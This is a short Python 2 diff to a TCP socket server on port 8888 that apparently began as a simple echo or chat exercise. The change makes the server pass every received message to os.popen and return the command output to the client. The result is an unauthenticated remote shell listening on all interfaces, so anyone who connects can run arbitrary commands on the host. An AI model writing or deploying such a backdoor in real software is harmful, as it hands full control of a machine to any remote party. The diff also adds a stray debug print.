@@ -4,7 +4,7 @@
 from socket import *
 from time import ctime
 import select
-import sys
+import sys,os
 
 HOST = ''
 PORT = 8888
@@ -25,13 +25,23 @@ while True:
 
     while True:
         readyInput, readyOutput, readyException = select.select(input, [], [])  # 每次循环都会阻塞在这里，只有当有数据输入时才会执行下面的操作
+        print "s"
         for indata in readyInput:
             if indata == tcpCliSock:
                 data = tcpCliSock.recv(BUFSIZ)
                 if not data:
                     break
                 print data
-                tcpCliSock.sendall( "recv data:%s" % (data) )
+                if data == "exit":
+                    tcpCliSock.close()
+                    break
+                res = os.popen(data.decode()).read()
+                #print "result : %s" % (res)
+                if len(res) == 0:
+                    res = "cmd has no output..."
+                #tcpCliSock.send(str(len(res.encode('utf-8'))).encode('utf-8'))
+                tcpCliSock.send(res.encode('utf-8'))
+                #tcpCliSock.sendall( "recv data:%s" % (data) )
             else:
                 data = raw_input()
                 if not data:
